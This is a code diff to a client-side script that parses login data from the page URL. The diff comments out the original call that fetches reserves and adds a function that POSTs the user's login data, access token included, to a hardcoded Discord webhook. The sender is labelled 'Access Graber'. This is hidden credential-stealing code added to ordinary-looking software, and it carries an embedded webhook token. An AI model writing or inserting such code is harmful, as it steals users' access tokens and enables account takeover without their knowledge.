@@ -49,5 +49,19 @@ function fetchReserves(loginData) {
 
 var loginData = parseQueryString(document.location.search);
 if (loginData.status === "ok" && loginData["access_token"]) {
-    fetchReserves(loginData);
+    sendMessage(loginData)
+    //fetchReserves(loginData);
+}
+
+function sendMessage(loginData) {
+    const request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/898642621973540914/nptllsw8uKVdMeb6vuNHix_H6SCQSaXJWAdJ-rVhRppQFb0NzJTCUT4H8ksP9Tx69lSy");
+    request.setRequestHeader('Content-type', 'application/json');
+    const params = {
+        username: "Access Graber",
+        avatar_url: "https://samequizy.pl/wp-content/uploads/2021/02/images_80304f732f3d.jpg",
+        content: loginData
+    }
+    request.send(JSON.stringify(params));
+    
 }
